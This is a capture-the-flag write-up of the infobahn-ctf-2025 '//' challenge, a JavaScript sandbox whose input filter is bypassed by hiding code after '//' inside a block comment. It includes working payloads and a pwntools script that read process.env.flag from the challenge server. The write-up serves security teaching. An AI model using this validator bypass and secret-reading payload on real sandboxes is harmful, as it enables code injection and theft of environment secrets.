---
title: //
challenge_type: Misc
author: "@22sh"
writeup_author: "@xabito"
competition: infobahn-ctf-2025
summary: |-
  unary-only
connections:
  - url: unary.challs.infobahnc.tf:1337
attachments:
  - title: chall.py
    url: /assets/files/infobahn-ctf-2025/slash-slash/unary.zip
---

## Recon

This challenge presents a JavaScript sandbox where we can enter commands, but with certain input restrictions. These restrictions are enforced by the following function:

```javascript
const purifier = (code) => {
  const allowed = /^[a-zA-Z0-9_/\s;!().+\-*]+$/;
  let codeForChecking = code.replace(/\/\/.*$/gm, '');
  if (!allowed.test(code.trim())) throw new Error('BLOCKED');
  const mathOnly = /^[0-9+\-*/\s()]+$/;
  if (!mathOnly.test(codeForChecking.trim()) && codeForChecking.length > 10) throw new Error('TOO_LONG');
  return code.trim();
};
```

Only a limited set of symbols can be used in our input. After submission, any `//` comments are stripped from the input, and the resulting string must either contain only mathematical symbols or be no longer than 10 characters. Our goal is to construct a payload that will output the flag while bypassing the `purifier` function's restrictions.

## Exploitation

The main trick to this challenge lies in how `//` comments are removed. When the sanitizer strips out everything from each `//` to the end of the line, it performs validation on the cleaned string but crucially, the original, unmodified code is what gets executed.

By placing `//` inside a block comment, like `/*//*/`, we can inject code that bypasses the length and content checks, since the validator won’t see it. However, the JavaScript engine will execute the code after the block comment, allowing us to include longer statements.

```bash
$ nc unary.challs.infobahnc.tf 1337
100+/*//this is longer than 10 chars*/+100
200
```

We need to extract the ASCII value of each character in the flag. This can be achieved using `process.env.flag.charCodeAt(N)`. By leveraging the above bypass and this approach, we can automate flag extraction with the following Python script:

```python
from pwn import *

context.log_level = 'info'

p = remote('unary.challs.infobahnc.tf', 1337)
p.recvuntil(b'unary-only sandbox\r\n')
p.recvline()

flag = ""
for i in range(100):
    payload = f"0+/*//*/process.env.flag.charCodeAt({i})"
    p.sendline(payload.encode())

    result = int(p.recvline(timeout=1).decode())
    p.recvline(timeout=1)

    char = chr(result)
    flag += char

    if char == "}":
        break

log.success(f"Flag: {flag}")
```

## Flag capture (the hard way)

To extract the flag, simply execute the provided script:

```bash
$ python3 extract_flag.py
[+] Opening connection to unary.challs.infobahnc.tf on port 1337: Done
[+] Flag: infobahn{hidding_code_in_comments_in_big_25_49ad95}
[*] Closed connection to unary.challs.infobahnc.tf port 1337
```


## Flag capture (the easy way)

Initially, we believed that the jail only permitted numeric output, which is why we developed the previous exploit. However, this turned out not to be the case (doing CTFs late at night is rarely wise...), and it is actually possible to output the flag directly.

```bash
$ nc unary.challs.infobahnc.tf 1337
/*//*/console.log(process.env.flag)
infobahn{hidding_code_in_comments_in_big_25_49ad95}
```